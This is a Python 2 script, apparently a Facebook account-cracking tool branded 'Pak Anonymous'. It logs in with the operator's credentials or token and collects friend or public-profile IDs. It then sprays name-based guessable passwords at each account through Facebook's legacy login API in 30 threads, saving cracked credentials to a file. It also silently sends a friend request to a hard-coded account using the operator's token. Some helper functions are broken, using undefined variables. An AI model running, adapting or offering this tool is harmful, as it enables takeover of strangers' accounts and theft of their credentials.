#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To BabarAli
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] \033[1;97mToken \033[1;97m:")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')

#Dev:Babar_Ali
##### LOGO #####
logo = """
\033[1;95m     |-------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----|
\033[1;95m     |               Pak Anonymous               |
\033[1;95m     |This Tool is Only for Pakistani FB Accounts|
\033[1;95m     |------+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+------|

\033[1;97m           [⚡\033[1;97mAuthor Name: Babar Ali     ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mPhone Numbr: +923000223253 ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mYutube Chnl: Pak Anonymous ⚡\033[1;97m]
\033[1;97m           [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;97m]
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;95m██╗░░██╗░█████╗░██╗░░░░░██╗
\033[1;95m██║░██╔╝██╔══██╗██║░░░░░██║
\033[1;95m█████═╝░███████║██║░░░░░██║
\033[1;95m██╔═██╗░██╔══██║██║░░░░░██║
\033[1;95m██║░╚██╗██║░░██║███████╗██║
╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝
      \033[1;95m██╗░░░░░██╗███╗░░██╗██╗░░░██╗██╗░░██╗
      \033[1;95m██║░░░░░██║████╗░██║██║░░░██║╚██╗██╔╝
      \033[1;95m██║░░░░░██║██╔██╗██║██║░░░██║░╚███╔╝░
      \033[1;95m██║░░░░░██║██║╚████║██║░░░██║░██╔██╗░
      \033[1;95m███████╗██║██║░╚███║╚██████╔╝██╔╝╚██╗
      \033[1;95m╚══════╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝
\033[1;91m•──────────────────────────•
\033[1;91mNote: \033[1;97mWelcome Sir/Mam 
\033[1;97mEnter Tool Username and Password 
And Continue
\033[1;91m•──────────────────────────•
 """
CorrectUsername = "kalilinux"
CorrectPassword = "Facebook"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;92m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Babar_Ali
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;93mWrong Password"
            os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;97m[1]\x1b[1;96mLogin With Facebook Account  "
        time.sleep(0.05)
        print "\033[1;97m[2]\x1b[1;96mLogin  With Token"
        time.sleep(0.05)
        print "\033[1;97m[3]\x1b[1;96mDownload Token App"
        time.sleep(0.05)
	print "\033[1;97m[0]\033[1;96mExit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option: \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan(' \033[1;91mWarning:\033[1;92m Do Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning:\033[1;92m Use a New Account To Login' )
		jalan(' \033[1;91mWarning: \033[1;92mTermux All Version Work ' )
		jalan(' \033[1;91mWarning: \033[1;92mYour Internet Should Be Fast ' )
		
		print('\033[1;97m\x1b[1;93m<<---------Login Your Facebook Account--------->>\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[*] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[*] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful•'
				os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Babar_Ali
	print logo
	print "  \033[1;92m\033[1;93m⚡⚡Logged in User Info\033[1;92m⚡⚡"
	print "	   \033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
	print "	   \033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
	print "\033[1;97m[1]\x1b[1;96mStart Hacking"
	print "\033[1;97m[2]\x1b[1;96mID Not Found Problem"
	print "\033[1;97m[3]\x1b[1;96mJoin Pak Anonymous Whatsapp Group"
	print "\033[1;97m[4]\x1b[1;96mContact With Pak Anonymous Owner On Facebook"
	print "\033[1;97m[5]\x1b[1;96mSubscribe Pak Anonymous Youtube Channel " 
	print "\033[1;97m[0]\033[1;96mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;95mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
        elif unikers =="1":		
	        super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
	elif unikers =="3":
		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
	        menu()
        elif unikers =="4":
		os.system('xdg-open https://facebook.com/Babar.ali7500')
	        menu()
	elif unikers =="5":
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option: \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="3":
		os.system('xdg-open https://chat.whatsapp.com/FlzjJ1wklTo3EvKtkSfwRZ')
	        menu()
        elif unikers =="4":
		os.system('xdg-open https://facebook.com/Babar.ali7500')
	        menu()
	elif unikers =="5":
		os.system('xdg-open https://m.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
                menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[1]\x1b[1;96mHack From Friend List"
	print "\033[1;97m[2]\x1b[1;96mHack From Public Accounts"
	print "\033[1;97m[0]\033[1;96mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;94mChoose an Option: \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
		print logo
		jalan('\033[1;93mGetting Accounts \033[1;93m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
		print logo
		idt = raw_input("\033[1;96m[*] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting Accounts\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;93mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mWait\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93m•Cloning Has Been Started•\033[1;93m"+o),;sys.stdout.flush();time.sleep(0.05)
	print "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]"
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
 	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'								
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'						
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'					
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[ * ] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
#Dev:Babar_Ali
        print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	print '\033[1;94m[Process Has Been Completed]'
